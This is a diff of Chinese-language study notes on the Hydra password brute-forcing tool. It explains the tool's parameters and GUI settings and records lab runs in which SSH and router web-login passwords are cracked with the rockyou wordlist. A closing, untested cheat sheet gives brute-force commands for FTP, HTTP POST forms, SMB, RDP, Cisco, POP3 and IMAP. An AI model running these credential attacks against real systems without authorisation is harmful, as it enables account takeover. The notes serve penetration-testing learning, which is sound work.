@@ -1,29 +1,16 @@
-❤️ Hydra 简介
+🔵 Hydra 摘要：
 
-https://www.youtube.com/watch?v=4bR7cTFNPpc
+    Hydra是世界顶级的密码暴力破解工具，支持几乎所有协议的在线密码破解 如:
+    http/https、ssh/telnet、smb/ftp、cisco、pop3、rdp、imap、web登录... 功能非常非常强大.
 
-🔸搜索并解压 rockyou 字典(Kali自带.)
-    打开资源管理器 ➜ 左上角 places 选择 computer ➜ 搜索 rockyou 会发现有个 rockyou.txt.gz 
-    选择这个文件 右键 ➜ open item location 打开文件所在位置 ➜ 再次选择文件 右键 ➜ extract to 解压到 
-    ➜ 选择桌面 ➜ 解压出错...
+    密码能否被破解的关键取决于破解字典是否足够强大,在网络安全渗透过程中，Hydra是必备工具.
 
-    用命令解压试试 .
-    cd /usr/share/wordlists/
-    gzip -d rockyou.txt.gz
-    可以...  解压出来的文件. 手动放到桌面去
-
-
-🔸 使用  hydra-gtk 
-    kali ➜ 左下角所有程序 ➜ 搜索: hydra-gtk 
-
-
-🔵 Hydra 
-hydra是一款开源的暴力密码破解工具，可以在线破解很多种密码非常强大.破解关键在于强大的字典.
-该工具支持几乎所有协议的在线密码破解http/https、ssh/telnet、smb/ftp、cisco、pop3、rdp、imap
+    除了命令行下的Hydra外，还提供了Hydra-GTK版本（有图形界面的Hydra
+    不建议使用图形界面! 不方便教学....
 
 
 
-Hydra参数详细说明
+🔵 Hydra参数详细说明
 
     l LOGIN：指定破解的用户名称，对特定用户破解。
     L FILE： 从文件中加载用户名进行破解。
@@ -53,72 +40,20 @@ Hydra参数详细说明
 
 
 
+🔵 使用简介
+
+    设置目标 
+    ip、端口、协议、
+    账户名、密码字典路径、
+    是否输出尝试攻击信息、
+    是否一旦找到一个密码就停止攻击.
+    同时运行的任务数量.
+    超时时间
 
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-🔵 开始破解.
-
-Tagget 界面 (启动界面)
-    设置目标的ip、端口、协议.
-
-    🔸single target
-        single target 后面填入目标路由器的ip.
-        我们这里是 192.168.11.2 这个是 中继路由器的ip. 不是主路由器的ip.
-
-        首先在kali虚拟机里 ping下 192.168.11.2 看能不能ping通. 虚拟机么.和实体机不一样的.
-
-    🔸port 80
-    这里填端口
-
-    🔸protocal 
-        被攻击目标所用的协议.这里是网页密码破解.选择 http-get 就可以了
-
-    🔸输出选项:
-        打勾 show attempts     查看密码攻击的过程
-        打勾 be verbose        详细输出?
-
-
-passwords 密码界面
-    在该界面指定用户名和密码.
-    用户名和密码 都可以使用文件!!!来进行批量尝试.
-
-    本例中使用Kali系统中自带的用户名和密码列表文件，并选择Loop around users选项。
-    其中，用户名和密码文件分别保存在/usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/names/nameslist.txt和/usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt中。
-
-    username 改成 admin
-    password list 双击 并定位到 rockyou.txt 文件
-    打勾 try login as password
-
-
-tuning 界面
-
-    在该界面设置任务的编号和超时时间。
-    如果运行任务太多的话，服务的响应速率将下降。
-    所以要建议将原来默认的任务编号16修改为2，超时时间修改为15。
-    然后将Exit after first found pair的复选框勾上，表示找到第一对匹配项时则停止攻击。
-
-start 界面
-    在该界面显示了四个按钮，分别是启动、停止、保存输出和清除输出. 单击Start按钮开始攻击，
-
-
-
-
-
-暴力破解.
-
-🔵 环境
+🔵 实测破解环境
 
   虚拟机 ip: 192.168.169.137 
   实体机 ip: 192.168.169.1 
@@ -156,56 +91,36 @@ start 界面
     我们来看看 能不能用字典爆破.
     首先查看字典. 里面有没有 i 这个密码. 没有就手动加进去.
 
-🔸hydra-gtd
-    然后进入 hydra-gtd 进行设置
-    target ➜ single target : 192.168.169.1
-    target ➜ port : 22
-    target ➜ protocol: ssh
-    target ➜ output options ➜ 打勾 be verbose
-    target ➜ output options ➜ 打勾 show attempts
+    🔸hydra-gtd
+        然后进入 hydra-gtd 进行设置
+        target ➜ single target : 192.168.169.1
+        target ➜ port : 22
+        target ➜ protocol: ssh
+        target ➜ output options ➜ 打勾 be verbose
+        target ➜ output options ➜ 打勾 show attempts
 
-    passwords ➜  username: xu.jian
-    passwords ➜ password list : 双击选择 rockyou.txt 的路径
+        passwords ➜  username: xu.jian
+        passwords ➜ password list : 双击选择 rockyou.txt 的路径
 
-    start ➜ start ... 等几秒就出来了.
-    [22][ssh] host: 192.168.169.1   login: xu.jian   password: i
-    1 of 1 target successfully completed, 1 valid password found
-    Hydra (http://www.thc.org/thc-hydra) finished at 2017-05-05 02:20:19
+        start ➜ start ... 等几秒就出来了.
+        [22][ssh] host: 192.168.169.1   login: xu.jian   password: i
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra (http://www.thc.org/thc-hydra) finished at 2017-05-05 02:20:19
 
-    说明确实是可以破解ssh的!! 能不能破解就看你字典是否厉害了..
-
-
-
-🔸hydra
-　　破解SSH账号有两种方式，一种是指定账号破解，另一种是指定用户列表破解，命令如下。
-
-    语法: hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
-
-    hydra -l root -P pwd2.dic -t 1 -vV -e ns 192.168.44.139 ssh
-    对IP地址为192.168.44.139的root账号
-
-    hydra -l root -P pwd2.dic -t 1 -vV -e ns -o save.log 192.168.44.139 ssh
-    将扫描结果保存在save.log文件中，使用“cat save.log”命令查看扫描结果
+        说明确实是可以破解ssh的!! 能不能破解就看你字典是否厉害了..
 
 
 
+    🔸hydra
+    　　破解SSH账号有两种方式，一种是指定账号破解，另一种是指定用户列表破解，命令如下。
 
+        语法: hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
 
+        hydra -l root -P pwd2.dic -t 1 -vV -e ns 192.168.44.139 ssh
+        对IP地址为192.168.44.139的root账号
 
-🔵 ftp 爆破
-
-  （1）破解指定用户名密码
-        hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
-        hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
-
-  （2）批量破解FTP账号和密码
-        hydra -L list_user -P list_password 192.168.56.101 ftp -V
-
-
-
-
-
-
+        hydra -l root -P pwd2.dic -t 1 -vV -e ns -o save.log 192.168.44.139 ssh
+        将扫描结果保存在save.log文件中，使用“cat save.log”命令查看扫描结果
 
 
 
@@ -269,6 +184,24 @@ start 界面
 
 
 
+
+
+
+
+
+
+
+🔵 GET方式提交，破解Web登录 ✔︎
+    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
+    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
+
+    hydra -s 80 -l admin -P /root/Desktop/rockyou.txt -vV -e ns 192.168.11.2 http-get /admin/
+    这个居然破解出来了.....路由器的登录密码
+
+    命令后面必须要有 /admin/啊
+
+
+
 🔵 路由登录密码爆破 ✔︎
     Router-Login Brute Force 
 
@@ -303,14 +236,79 @@ start 界面
 
 
 
-🔵 GET方式提交，破解Web登录 ✔︎
-    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
-    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
 
 
-    hydra -s 80 -l admin -P /root/Desktop/rockyou.txt -vV -e ns 192.168.11.2 http-get /admin/
-    这个居然破解出来了.....
 
-    命令后面必须要有 /admin/啊
+
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+下面的都没测试过.
+
+    参考文章
+
+    https://yq.aliyun.com/articles/66881?utm_campaign=wenzhang&utm_medium=article&utm_source=QQ-qun&utm_content=m_8597
+　　本文选自《黑客攻防：实战加密与解密》。
+
+
+
+
+
+🔵 ftp 爆破 ??
+
+  （1）破解指定用户名密码
+        hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
+        hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
+
+  （2）批量破解FTP账号和密码
+        hydra -L list_user -P list_password 192.168.56.101 ftp -V
+
+
+
+🔵 POST方式提交，破解Web登录  ???
+
+    hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php: username= ^USER^ &password=^PASS^&submit=login:sorry password"
+
+
+
+
+．破解HTTPS
+hydra -m /index.php -l muts -P pass.txt 192.168.0.115 https
+
+
+8．破解SMB
+hydra -l administrator -P pass.txt 192.168.0.115 smb
+
+
+
+7．破解Cisco
+hydra -P pass.txt 192.168.0.115 cisco
+hydra -m cloud -P pass.txt 192.168.0.115 cisco-enable
+
+
+9．破解POP3
+hydra -l muts -P pass.txt my.pop3.mail pop3
+
+
+．破解远程终端账号
+（1）破解管理员账号
+
+hydra ip rdp -l administrator -P pass.txt -V
+（2）批量破解账号
+
+hydra -s 3389 192.168.44.138 rdp -L user.txt  -P pwd.txt –V
+
+
+11．破解HTTP-Proxy
+hydra -l admin -P pass.txt http-proxy://192.168.0.115
+12．破解IMAP
+hydra -L user.txt -p secret 192.168.0.115 imap PLAIN
+hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
+
+
+
+
+
+
+
 
 
